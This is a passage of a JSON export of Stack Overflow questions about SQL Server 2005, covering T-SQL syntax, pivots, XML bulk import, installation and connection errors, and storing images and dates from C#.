;\n</code></pre>\n\n<p>I am shocked that this is causing a syntax error warning.</p>\n\n<p>I can do this...  </p>\n\n<pre><code>EXEC MyStoredProc @MyVar ;\n</code></pre>\n\n<p>and I can do this...   </p>\n\n<pre><code>EXEC MyStoredProc 101 ;\n</code></pre>\n\n<p>but I can't do this...   </p>\n\n<pre><code>EXEC MyStoredProc @MyVar + 1  ;\n</code></pre>\n\n<p>This is going to make my script a LOT harder to write unless I am missing something.  This is for SQL 2005.</p>\n"},{"tags":["sql-server-2005","stored-procedures","sql-server-2000","asp.net-4.0"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12873313,"title":"Creating a complex stored-procedure to get multi-tables output","body":"<p>I have product catalog that have two levels of categories and brands associated with the products.</p>\n\n<p>Tables Like:</p>\n\n<p>Products : ProductID | CategoryID | BrandID</p>\n\n<p>Categories : CategoryID | ParentID | Image(bit)</p>\n\n<p>What I need is while browsing the brands pages I select all \"Parent Categories\" that are parents for categories associated with products added already under this brand using a Stored Procedure... and make sure to get the value of the Image column</p>\n\n<h1>What I Used</h1>\n\n<pre><code>CREATE PROCEDURE [dbo].[GetBrandProductsCats]\n@iLanguageID int,\n@iBrandID int\nAs\nBegin\nSELECT C.Image, C.CategoryID, C.ParentID,CD.Title, CD.Summary, BrandID = @iBrandID\nFROM Categories C\n    Join CategoryData CD on C.ParentID = CD.CategoryID\nWHERE C.CategoryID in \n    (SELECT Products.CategoryID  \n     FROM Products \n     WHERE Products.BrandID = @iBrandID)\n\nEnd\nGO\n</code></pre>\n\n<p>This actually worked but the Image column value is not for the parent category</p>\n\n<p>Any Ideas ? wish you have one cause I got tired :)</p>\n\n<p>Thank you all in advance</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","pivot"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":146,"score":1,"question_id":11847584,"title":"Transposing Rows in to colums in SQL Server 2005","body":"<p>I have an sql query \"Select * from tablename\" whose output is </p>\n\n<pre><code>col1   col2       \n  A     1 \n  B     2 \n  C     3\n</code></pre>\n\n<p>I want to modify the above output to below as following</p>\n\n<pre><code>A      B      C\n1      2      3 \n</code></pre>\n\n<p>Please let me know how could I achieve this</p>\n"},{"tags":["sql-server","sql-server-2005","tsql","insert"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":248,"score":2,"question_id":3004282,"title":"In SQL Server, how can I insert data into a table that has just one column which is of identity type?","body":"<p>In SQL Server, how can I insert data into a table that has just one column which is of identity type?\nSuch as insert into the following table <strong>t</strong>.\nHow can I write the insert statement?</p>\n\n<pre><code>CREATE TABLE t\n(\n    id INT IDENTITY(1, 1) PRIMARY KEY\n)\n</code></pre>\n\n<p>Great thanks.</p>\n"},{"tags":["sql-server","sql-server-2005","windows-7"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3588,"score":1,"question_id":5065338,"title":"How can I resolve error 233 in SQL Server 2005 under Windows 7?","body":"<p>I'm creating a new login with SQL Server authentication. Once the login is created, I then try to connect to the database using SQL Server authentication. This produces the following error:</p>\n\n<blockquote>\n  <p>Cannot connect to (SERVER NAME) i.e machine name/sql\\express </p>\n</blockquote>\n\n<p>Additional Information:</p>\n\n<blockquote>\n  <p>A connection was successfully\n  established with the server, but then\n  an error  occurred during the login\n  process.  (provider: Shared Memory\n  Provider,  error: 0 - No process is on\n  the other end of the pipe.) \n  (Microsoft SQL  Server, Error: 223)</p>\n</blockquote>\n\n<p>Here is what I have already tried for troubleshooting:</p>\n\n<ul>\n<li>Enabling all the protocols</li>\n<li>Ensuring that I am running as Administrator</li>\n<li>Setting the Authentication Mode to Windows and SQL Server Authentication</li>\n</ul>\n\n<p>Unfortunately, none of these steps seem to have worked. How can I fix this error?</p>\n"},{"tags":["php","xml","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12864952,"title":"Using PHP and SQL Server 2005, can I return data from an XML field and convert to a string?","body":"<p>I have a SQL Server 2005 table which has XML snippets in an xml column. To properly use XSL to convert the snippets to XHTML, I need to surround the snippet with additional nodes, etc. My thought is that I need to be able to handle the XML data as a string, then I can prepend and postpend to it and then convert to a DOM object.</p>\n\n<p>Is this the right way to go? Is there a better way?</p>\n\n<p>Here is an example of where I need to put the snippet (which can be fairly large): </p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;document xmlns=\"urn:hl7-org:v3\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"urn:hl7-org:v3 http://www.accessdata.fda.gov/spl/schema/spl.xsd\"&gt;\n    &lt;id /&gt;\n    &lt;code /&gt;\n    &lt;effectiveTime  /&gt;\n    &lt;component&gt;\n        &lt;structuredBody&gt;\n            &lt;&lt; SNIPPET GOES HERE &gt;&gt;\n        &lt;/structuredBody&gt;\n    &lt;/component&gt;\n&lt;/document&gt;\n</code></pre>\n"},{"tags":["sql-server","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12864058,"title":"SQL Server 2005 PIVOT Syntax Error","body":"<p>I receive the following error</p>\n\n<p>Msg 156, Level 15, State 1, Line 10\nIncorrect syntax near the keyword 'SELECT'.\nMsg 102, Level 15, State 1, Line 10\nIncorrect syntax near ')'.</p>\n\n<p>When I run the following query</p>\n\n<pre><code> SELECT TOP 100 *\nFROM\n(\nSELECT [TimeStamp],[MeterID],[Value]\nFROM access_AMIData) AS source\nPIVOT\n(\nSUM(Value)\nFOR MeterID IN (SELECT MeterNumber FROM access_tblFcppPvMeterList)\n) as pvt\nORDER BY TimeStamp\n</code></pre>\n\n<p>The error comes with this line:</p>\n\n<pre><code>FOR MeterID IN (SELECT MeterNumber FROM access_tblFcppPvMeterList)\n</code></pre>\n\n<p>If I change this line to:</p>\n\n<pre><code>FOR MeterID IN (1,2,3,4)\n</code></pre>\n\n<p>It works perfectly...how can I specify a select Query inside the IN?</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","pivot"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":71,"score":-2,"question_id":12862916,"title":"SQL Server 2005 Rows to Columns","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/10652921/t-sql-group-rows-into-columns\">T-SQL Group Rows Into Columns</a>  </p>\n</blockquote>\n\n\n\n<p>I have a table _data that is formatted like this</p>\n\n<pre><code>TimeStamp                        MeterID      Value\n2012-04-15 13:00:00.000          CK1992       152.64\n2012-04-15 12:45:00.000          CK1992       151.695\n2012-07-06 12:45:00.000          CK1992       150.84\n2012-09-04 12:00:00.000          CK1992       150.66\n2012-04-15 12:15:00.000          CK1992       150.57\n</code></pre>\n\n<p>I need to be able to format that table as something like this</p>\n\n<pre><code>Timestamp     MeterID1     MeterID2     MeterID3\nstamphere     value        value        value\n</code></pre>\n\n<p>I have a lot of different MeterIDs so it needs extract it accordingly.</p>\n\n<p>Here is my existing select statement:</p>\n\n<pre><code>SELECT [TimeStamp]\n  ,[MeterID]\n  ,[Value]\nFROM [dbo].[_Data]\n</code></pre>\n\n<p>How can I make this work? Thanks for your help!</p>\n"},{"tags":["database","sql-server-2005"],"answer_count":14,"favorite_count":3,"up_vote_count":6,"down_vote_count":1,"view_count":3223,"score":5,"question_id":707117,"title":"SQL 'ORDER BY' slowness","body":"<p>Is it true that <code>ORDER BY</code> is generally pretty slow? I am trying to run some sql statements where the <code>WHERE</code> clause is pretty simple, but then I am trying an <code>ORDER BY</code> on a <code>VARCHAR(50)</code> indexed column.</p>\n\n<p>I need to sort alphabetically for display reasons. I figured that getting the database to do it for me is the most efficient. </p>\n\n<p>At this point, I am looking to either </p>\n\n<ul>\n<li>optimize the sql query</li>\n<li>sort the result set in code </li>\n</ul>\n\n<p>Here is the actual query I am trying to run:</p>\n\n<pre><code>// B.SYNTAX is a TEXT/CLOB field\n// Indexes on NAME, MODULENAME. PREVIOUS is a CHAR(1) with no index\n\"SELECT A.NAME, B.SYNTAX, B.DESCRIPTION, A.RATE1, A.RATE2, \nA.RATE3, A.STARTDATE, A.ENDDATE, A.HIDE, A.CATEGORYNAME \nFROM A, B WHERE A.MODULENAME='\"+loadedModuleName+\"' \nAND A.NAME = B.NAME AND (A.PREVIOUS&lt;&gt;'N' OR A.PREVIOUS IS NULL) \nORDER BY A.NAME\"\n</code></pre>\n\n<p>The size of table A is ~2000 rows and B is about ~500.</p>\n\n<p>I should probably also mention that I cannot do much database specific optimization since we support multiple databases. Also, the application is deployed at a customer site.</p>\n\n<p>I am expecting hundreds of records to be returned (less than 1000).</p>\n\n<p>What would you do? Any tips are appreciated. Thanks.</p>\n"},{"tags":["sql-server-2005","stored-procedures","asynchronous"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12862356,"title":"Asynchronous stored procedure","body":"<p>Given the following two SQL Server 2005 stored procedures (samples only):</p>\n\n<p><strong>ProcA:</strong></p>\n\n<pre><code>ALTER PROCEDURE [dbo].[ProcA]\nAS\nBEGIN\n    EXEC ProcB\nEND\n</code></pre>\n\n<p><strong>ProcB:</strong></p>\n\n<pre><code>ALTER PROCEDURE [dbo].[ProcB]\nAS\nBEGIN\n    WAITFOR DELAY '000:00:10'\nEND\n</code></pre>\n\n<p>When <code>ProcA</code> is executed, it predictably takes 10 seconds since it is waiting for <code>ProcB</code> to complete. </p>\n\n<p>Is it possible to have <code>ProcA</code> call <code>ProcB</code> <strong>asynchronously</strong>, so that <code>ProcA</code> returns as soon as it has called <code>ProcB</code> and does not wait for <code>ProcB</code> to complete before returning?</p>\n"},{"tags":["xml","sql-server-2005","microsoft","bulk-load"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":53,"score":1,"question_id":12860334,"title":"XML file import to SQL database with multiple children","body":"<p>I'm trying to import an XML file into a SQL Server database. Please have a look on the code and on the xml file. Thanks in advance. </p>\n\n<p>I tried to google lot of pages but all of them deal with only one child (or how to call it). </p>\n\n<p>But In my real xml the structure is like </p>\n\n<pre><code>:1x supplier --&gt; multiple orders --&gt; multiple customers --&gt; multiple products. \n</code></pre>\n\n<p>We need to create a stored procedure which will be called when we get the XML file. </p>\n\n<p>Thanks again Petr</p>\n\n<p>SQL code:</p>\n\n<pre><code>DROP TABLE #TEST\n\nCREATE TABLE #TEST\n(CUSTID VARCHAR(10),CUSTNAME VARCHAR(50),PRODUCT VARCHAR(500))\n\nINSERT INTO #TEST(CUSTID,CUSTNAME,PRODUCT)\nSELECT\n    x.orders.query('order/customer/cust_id').value('.', 'VARCHAR(10)'),\n    x.orders.query('order/customer/name').value('.', 'VARCHAR(50)'),\n    x.orders.query('order/product_lines/product/supplier_prod_num').\n   value('.','VARCHAR(500)') \nFROM\n   (SELECT CAST(x AS XML)\n    FROM OPENROWSET(\n          BULK '\\\\test\\Test.xml',\n          SINGLE_BLOB) AS T(x)) AS T(x) \n    CROSS APPLY\n        x.nodes('order_batch/orders/order/product_lines/product') AS x(orders)\n\nselect * from #test\n</code></pre>\n\n<p>XML file to test:</p>\n\n<pre><code>&lt;order_batch&gt;\n  &lt;order_header&gt;\n    &lt;doc_format_ver&gt;1.0&lt;/doc_format_ver&gt;\n    &lt;originating_software&gt;\n      &lt;software_name&gt;test&lt;/software_name&gt;\n      &lt;software_ver&gt;2.0&lt;/software_ver&gt;\n    &lt;/originating_software&gt;\n  &lt;/order_header&gt;\n  &lt;supplier&gt;\n    &lt;cp_supplier_id&gt;93&lt;/cp_supplier_id&gt;\n    &lt;name&gt;supname&lt;/name&gt;\n    &lt;address_line_1&gt;address_line_1&lt;/address_line_1&gt;\n    &lt;address_line_2&gt;address_line_1&lt;/address_line_2&gt;\n  &lt;/supplier&gt;\n  &lt;orders&gt;\n    &lt;order o_count=\"1\"&gt;\n      &lt;customer&gt;\n        &lt;cust_id&gt;7240&lt;/cust_id&gt;\n        &lt;name&gt;CustNamek&lt;/name&gt;\n        &lt;address_line_1&gt;address_line_1&lt;/address_line_1&gt;\n        &lt;address_line_2&gt;address_line_1&lt;/address_line_2&gt;\n      &lt;/customer&gt;\n      &lt;order_details&gt;\n        &lt;date_created&gt;2012-10-08&lt;/date_created&gt;\n        &lt;time_created&gt;05:37:11&lt;/time_created&gt;\n      &lt;/order_details&gt;\n      &lt;product_lines&gt;\n        &lt;product p_count=\"1\"&gt;\n          &lt;supplier_prod_num&gt;15115&lt;/supplier_prod_num&gt;\n          &lt;qty_type&gt;E&lt;/qty_type&gt;\n        &lt;/product&gt;\n        &lt;product p_count=\"2\"&gt;\n          &lt;supplier_prod_num&gt;010211&lt;/supplier_prod_num&gt;\n          &lt;qty_type&gt;E&lt;/qty_type&gt;\n        &lt;/product&gt;\n      &lt;/product_lines&gt;\n    &lt;/order&gt;\n    &lt;order o_count=\"2\"&gt;\n      &lt;customer&gt;\n        &lt;cust_id&gt;7238&lt;/cust_id&gt;\n        &lt;name&gt;custname&lt;/name&gt;\n        &lt;address_line_1&gt;address_line_1&lt;/address_line_1&gt;\n        &lt;address_line_2&gt;address_line_1&lt;/address_line_2&gt;\n      &lt;/customer&gt;\n      &lt;order_details&gt;\n        &lt;supplier_ref&gt;0093513982&lt;/supplier_ref&gt;\n        &lt;delivery_date&gt;2012-10-08&lt;/delivery_date&gt;\n        &lt;special_instructions /&gt;\n      &lt;/order_details&gt;\n      &lt;product_lines&gt;\n        &lt;product p_count=\"1\"&gt;\n          &lt;supplier_prod_num&gt;6748&lt;/supplier_prod_num&gt;\n          &lt;qty_type&gt;E&lt;/qty_type&gt;\n        &lt;/product&gt;\n        &lt;product p_count=\"2\"&gt;\n          &lt;supplier_prod_num&gt;6744&lt;/supplier_prod_num&gt;\n          &lt;qty_type&gt;E&lt;/qty_type&gt;\n        &lt;/product&gt;\n      &lt;/product_lines&gt;\n    &lt;/order&gt;\n  &lt;/orders&gt;\n&lt;/order_batch&gt;\n</code></pre>\n"},{"tags":["c#","sql-server-2005","datetime"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":6,"view_count":463,"score":-6,"question_id":10991658,"title":"How to insert DateTime into SQL Server 2005 database","body":"<p>I have a C# windows forms (standalone) app where user needs to pick desired date time and when click a save button, that has to be stored into the database.</p>\n\n<ol>\n<li>how do I display a calendar on my form (with a text box) user to pick any date?</li>\n<li>which type of column should I create in my database table (in SQL Server 2005) to store the date and time entered by user? </li>\n<li>how do I retrieve the date and time from the database and display it in a text box?</li>\n</ol>\n\n<p>Thanks.</p>\n"},{"tags":["sql-server-2005","tsql","aggregate-functions"],"answer_count":8,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":10469,"score":6,"question_id":773417,"title":"Aggregate SQL Function to grab only the first from each group","body":"<p>I have 2 tables - an Account table and a Users table.  Each account can have multiple users.  I have a scenario where I want to execute a single query/join against these two tables, but I want all the Account data (Account.*) and only the <em>first</em> set of user data (specifically their name).</p>\n\n<p>Instead of doing a \"min\" or \"max\" on my aggregated group, I wanted to do a \"first\".  But, apparently, there is no \"First\" aggregate function in TSQL.</p>\n\n<p>Any suggestions on how to go about getting this query?  Obviously, it is easy to get the cartesian product of Account x Users:</p>\n\n<pre><code> SELECT User.Name, Account.* FROM Account, User\n WHERE Account.ID = User.Account_ID\n</code></pre>\n\n<p>But how might I got about only getting the first user from the product based on the order of their User.ID ?</p>\n"},{"tags":["sql","sql-server-2005","foreign-keys"],"answer_count":2,"favorite_count":3,"up_vote_count":10,"down_vote_count":0,"view_count":8111,"score":10,"question_id":869081,"title":"A way to check if foreign key exists in SQL 2005","body":"<p>Is there an easy way to check if a foreign key exists for a column in a table? I am writing a script which will add the foreign key only if it does not exist.</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server-2005","full-text-search","full-text-indexing"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12857235,"title":"Query searched in FullText Search","body":"<p>I'm having a very specific issue with Full - Text Index search.</p>\n\n<p>I'm trying to search as follows:</p>\n\n<pre><code>Contains(Searchfield,'IT`dash`10116')\n</code></pre>\n\n<p>Using SQL 2008, I found that it looks for an exact match of '<strong>IT`dash`10116</strong>'. Also, I confirmed that the term '<strong>IT`dash`10116</strong>' is indexed in the table.</p>\n\n<p>In my dev server which is SQL Server 2005(9.00.5000), I find that it is hitting an exact search for the mentioned string.</p>\n\n<p>Unfortunately, in my production server which is SQL Server 2005(9.00.4035), it is just looking for a match of '<strong>10116</strong>' and giving results which have <strong>10116</strong> in them. I believe that word is also indexed as '<strong>10116</strong>' instead of '<strong>IT`dash`10116</strong>'. (Noise word list for this instance is not empty)</p>\n\n<p>Can anyone tell me why is this distinct behavior found in the two versions. Is there a way I can view the indexed words and the search query split up in Sql2005</p>\n"},{"tags":["c#","asp.net","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1078,"score":0,"question_id":11030952,"title":"Unable to retrieve or store image in database SQL Server 2005","body":"<p>I am trying to retrieve image from back end in ASP.Net. Using SQL SERVER 2005 as back end. I have tried n number of codes including the one available online. Can any one guide me solve this issue.</p>\n\n<p>My code is below</p>\n\n<p>Table Design:-</p>\n\n<pre><code>create table Image\n (\nImageId Int identity (1,1),ImageName Varchar(50), Image image   \n)\n</code></pre>\n\n<p>Code:-</p>\n\n<pre><code>    protected void Page_Load(object sender, EventArgs e)\n    {\n        if (!IsPostBack)\n        {\n            BindGridData();\n        }\n    }\n    string strcon = \"Data Source=SUJITHA\\\\SQLEXPRESS;Initial Catalog=master;Integrated Security=True\";\n    protected void Button1_Click(object sender, EventArgs e)\n    {\n        if (FileUpload1.HasFile)\n        {\n            //getting length of uploaded file\n            int length = FileUpload1.PostedFile.ContentLength;\n            //create a byte array to store the binary image data\n            byte[] imgbyte = new byte[length];\n            //store the currently selected file in memeory\n            HttpPostedFile img = FileUpload1.PostedFile;\n            //set the binary data\n            img.InputStream.Read(imgbyte, 0, length);\n            string imagename =TextBox1.Text;\n            //use the web.config to store the connection string\n            SqlConnection connection = new SqlConnection(strcon);\n            connection.Open();\n            SqlCommand cmd = new SqlCommand(\"INSERT INTO Image (ImageName,Image) VALUES (@imagename,@imagedata)\", connection);\n            cmd.Parameters.Add(\"@imagename\", SqlDbType.VarChar, 50).Value = imagename;\n            cmd.Parameters.Add(\"@imagedata\", SqlDbType.Image).Value = imgbyte;\n            int count = cmd.ExecuteNonQuery();\n            connection.Close();\n            if (count == 1)\n            {\n                BindGridData();\n                TextBox1.Text = string.Empty;\n                ScriptManager.RegisterStartupScript(this, this.GetType(), \"alertmessage\", \"javascript:alert('\" + imagename + \" image inserted successfully')\", true);\n            }\n        }\n    }\n\n    private void BindGridData()\n    {\n        SqlConnection connection = new SqlConnection(strcon);\n        SqlCommand command = new SqlCommand(\"SELECT ImageName,Image  from [Image]\", connection);\n        SqlDataAdapter daimages = new SqlDataAdapter(command);\n        DataTable dt = new DataTable();\n        daimages.Fill(dt);\n       GridView1.DataSource = dt;\n       GridView1.DataBind();\n       GridView1.Attributes.Add(\"bordercolor\", \"black\");\n    }\n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12856618,"title":"SQL Server service failed to start","body":"<p>while installing sql server 2005 following error came but installed</p>\n\n<blockquote>\n  <p>The SQL Server service failed to start. For more information, see the SQL Server Books Online topics, \"How to: View SQL Server 2005 Setup Log Files\" and \"Starting SQL Server Manually.</p>\n</blockquote>\n\n<p>so i tried to start these following services but it's not getting started because it shown below Error</p>\n\n<pre><code>msftesql$SQLEXPRESS1234\nMSSQL$SQL2005\nMSSQLServerADHelper\nmsftesql$SMARTSQL2005\nmsftesql$SQLEXPRESS\nmsftesql$SQLEXPRESS123\nmsftesql$SQLEXPRESS1234\nMSSQL$SQLEXPRESS1234\nMSSQL$SQLEXPRESS123\nMSSQL$SQLEXPRESS\nSQLBrowser\n</code></pre>\n\n<p>Error is</p>\n\n<blockquote>\n  <p>Windows could not start the sql server the above services on Local Computer.</p>\n  \n  <p>Error2:The system cannot find the file specified.</p>\n</blockquote>\n\n<p>so i am trying to login but it's got failure and showing message like</p>\n\n<blockquote>\n  <p>A network-related or instance-specific error occurred while establishing a connection to SQL Server. The server was not found or was not accessible.</p>\n  \n  <p>Verify that the instance name is correct and that SQL Server is configured to allow remote connections. (provider: SQL Network Interfaces, error: 26 - Error Locating Server/Instance Specified) (Microsoft SQL Server, Error: -1)</p>\n</blockquote>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12852637,"title":"Issue in installing SQL Server 2005","body":"<p>Before I have SQL Server 2005. It's gotten corrupted so I uninstalled and tried to installing a new one. While installing, the following error appears, but installed in Windows Authentication mode.</p>\n\n<blockquote>\n  <p><em>The SQL Server service failed to start. For more information, see the SQL Server Books Online topics, \"How to: View SQL Server 2005 Setup Log Files\" and \"Starting SQL Server Manually.</em></p>\n</blockquote>\n\n<p>But when I tried to log in, the following error will appear:</p>\n\n<blockquote>\n  <p><em>A network-related or instance-specific error occurred while establishing a connection to SQL Server. The server was not found or was not accessible.</em></p>\n  \n  <p><em>Verify that the instance name is correct and that SQL Server is configured to allow remote connections. (provider: SQL Network Interfaces, error: 26 - Error Locating Server/Instance Specified) (Microsoft SQL Server, Error: -1)</em></p>\n</blockquote>\n"},{"tags":["c#","sql-server-2005","datetimeoffset"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":154,"score":0,"question_id":11459347,"title":"How do you store DateTimeOffset in a SQL Server DateTime field","body":"<p>This is in C#</p>\n\n<p>I'm consuming data from an RSS feed and want to store the data in our database. The problem that I'm having is how to store the LastUpdateTime.</p>\n\n<pre><code>XmlReader reader = XmlReader.Create(uri);\nSyndicationFeed rssFeed = SyndicationFeed.Load(reader);\n\nvar lastUpdate = rssFeed.LastUpdatedTime;\n</code></pre>\n\n<p>The problem is that rssFeed.LastUpdateTime is a DateTimeOffset. However, we're using SQL Server 2005, which only has DateTime. What is the best practice for handling this scenario? If it matters, all our databases and servers are on Eastern time.</p>\n\n<p>Thanks.</p>\n"},{"tags":["c#","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":75,"score":0,"question_id":12846643,"title":"Connecting SQL SERVER in C#.net on networked server","body":"<p>I have an existing application build in C#.net, using SQL SERVER 2005, earlier application and SQL was on same machine, but now I need to connect SQL which is on server and is networked to the machine on which application is installed.\nSo can any one tell me how to connect SQL to application , and what changes need to be made in connection string.</p>\n\n<p>Thanks \nEDIT : I am a bit new to c#.net.\n currently my connection string is : public SqlConnection con = new sqlConnection(\"server=.;database=Database1;integrated security=sspi); so if I just put this will it directly connect to the SQL which is on other computer ?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","qtp"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":39,"score":1,"question_id":12841479,"title":"Running SQL Server Agent job from QTP","body":"<p>Can anyone please help me with the vbscript code to run a particular job in SQL Server 2005. The job is located at SQL Server Agent->Jobs-><em>JOB</em> </p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12844142,"title":"Delete rows with continuous dates within date period in SQL Server","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12848024/trying-to-consolidate-employer-records-who-are-continuously-work-for-same-depart\">Trying to consolidate employer records who are continuously work for same department</a>  </p>\n</blockquote>\n\n\n\n<p>I am trying to consolidate employees records who have been continuously (<em>anything &lt; 45 days</em>) enrolled with the specific department  </p>\n\n<p><strong>Note</strong>: If the date diff (<em>between <code>emp_eff_to_date</code> and next row <code>emp_eff_from_date</code></em>) is less than 45 days then it is considered as continuous </p>\n\n<h3>INPUT:</h3>\n\n<pre><code>EMP_ID +      DEPT_ID +        EMP_EFF_FROM_DATE +      EMP_EFF_TO_DATE\n-----------------------------------------------------------------------\n10       10001       8/1/2008              10/31/2009\n10       10001       11/1/2009              2/25/2010\n10       10001       2/26/2010              5/1/2011\n10       10001       8/1/2011              10/30/2011\n10       10001       12/1/2011             10/31/2012\n10       10003       7/1/2007              10/31/2007\n10       10004       9/27/2004              6/8/2006\n10       10004       6/30/2006              6/29/2007\n10       10007       6/25/2006              6/20/2007\n10       10007       8/25/2007              5/25/2008\n</code></pre>\n\n<h3>Output desired:</h3>\n\n<pre><code>EMP_ID         DEPT_ID      EMP_EFF_FROM_DATE     EMP_EFF_TO_DATE\n-------------------------------------------------------------------------\n10          10001        2008-08-01             2011-05-01\n10          10001        2011-08-01             2012-10-31\n10          10003        2007-07-01             2007-10-31\n10          10004        2004-09-27             2007-06-29\n10          10007        2006-06-25             2007-06-20\n10          10007        2007-08-25             2007-06-29\n</code></pre>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","contiguous"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":63,"score":-1,"question_id":12848024,"title":"Trying to consolidate employer records who are continuously work for same department","body":"<p>Trying to consolidate employer who worked same department where TO_DATE and Preceding From date is less than days ..</p>\n\n<p>DATA :</p>\n\n<pre><code>EMP_ID | DEPT_ID |EMP_EFF_FROM_DATE |EMP_EFF_TO_DATE\n10 | 10001 |2008-08-01 | 2009-10-31\n10 |10001 |2009-11-01 | 2010-02-25\n10 | 10001 | 2010-02-26 | 2011-05-01\n10 | 10001 | 2011-08-01 | 2011-10-30\n10 | 10001 | 2011-12-01 | 2012-10-31\n10 | 10003 | 2007-07-01 | 2007-10-31\n10 | 10004 | 2004-09-27 | 2006-06-08\n10 | 10004 | 2006-06-30 | 2007-06-29\n10 | 10007 | 2006-06-25 | 2007-06-20\n10 | 10007 | 2007-08-25 | 2008-05-25 \n</code></pre>\n\n<p>Desired Output:</p>\n\n<pre><code>EMP_ID| DEPT_ID | EMP_EFF_FROM_DATE | EMP_EFF_TO_DATE\n10 | 10001 | 2008-08-01 | 2011-05-01\n10 | 10001 | 2011-08-01 | 2012-10-31\n10 | 10003 | 2007-07-01 | 2007-10-31\n10 | 10004 | 2004-09-27 | 2007-06-29\n10 | 10007 | 2006-06-25 | 2007-06-20\n10 | 10007 | 2007-08-25 | 2007-06-29\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005","cross-apply"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":12846320,"title":"Using Table valued Function in join","body":"<p>There is a Table valued function which gives multiple rows as output and there are 2 columns as output.</p>\n\n<p>Now I want use this function in the query for all the employees in the employees table</p>\n\n<p>I am using CROSS APPLY but its taking long time and doesn't give any result.</p>\n\n<p>This is the query which I tried</p>\n\n<pre><code>select *\nfrom emp A Cross APPLY fnempDiv(A.EmpID)\n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":8,"favorite_count":2,"up_vote_count":7,"down_vote_count":1,"view_count":33309,"score":6,"question_id":721471,"title":"How can I rollback an UPDATE query in SQL server 2005?","body":"<p>How can I rollback an UPDATE query in SQL server 2005?</p>\n\n<p>I need to do this in SQL, not through code.</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12842052,"title":"sp_send_dbmail error","body":"<p>How can i pass multiple query in a <code>@query parameter</code> in <code>sp_send_dbmail</code>?</p>\n\n<p>For example:</p>\n\n<pre><code>select count(*) from TableA\nIF count(*)/ @@rowcount = 0  \nExec sp_send_dbmail @profile_name = xx, @recipients = 'xx@abc.com',@subject = 'Test', @body= ' No rows';\nIF count(*)/ @@rowcount &gt; 0\nExec sp_send_dbmail @profile_name = xx, @recipients = 'xx@abc.com',@subject = 'Test', \n@body= ' xx rows';\n</code></pre>\n\n<p>I am not getting any error message, but it stops after the first select statement.</p>\n"},{"tags":["sql","sql-server-2005","sql-update"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":12841894,"title":"Duplicate colum values","body":"<p>I have a table with 4 colums.</p>\n\n<pre><code>Id  Description Barcode     Type\n1   A01         L001        Loc\n2   A02         L002        Loc\n3   B01         L003        Loc\n4   Root        L004        Parent\n5   Emplacement L005        Parent\n6   C01         L006        Loc\n7   C02         L007        Loc\n</code></pre>\n\n<p>I want to make an UPDATE of the 'Barcode' column with the value in the 'Description' column where the Type column contains \"Loc\".</p>\n\n<p>I tried something like this:</p>\n\n<pre><code>UPDATE MyTable\nSET Barcode=Description\nWHERE Type='Loc'\n</code></pre>\n\n<p>It seems like I'm getting something wrong.</p>\n"},{"tags":["sql-server-2005","unicode","ssis","types","non-unicode"],"answer_count":6,"favorite_count":0,"up_vote_count":8,"down_vote_count":0,"view_count":15881,"score":8,"question_id":1299575,"title":"Import Package Error - Cannot Convert between Unicode and Non Unicode String Data Type","body":"<p>I am trying to troubleshoot this error without success.</p>\n\n<p>I have made a dtsx package on my computer using SQL Server 2008.  It imports data from a semicolon delimited csv file into a table where all of the field types are NVARCHAR MAX.</p>\n\n<p>It works on my computer, but it needs to run on the clients server.  Whenever they create the same package with the same csv file and destination table, they receive the error above.</p>\n\n<p>We have gone through the creation of the package step by step, and everything seems OK.  The  mappings are all correct, but 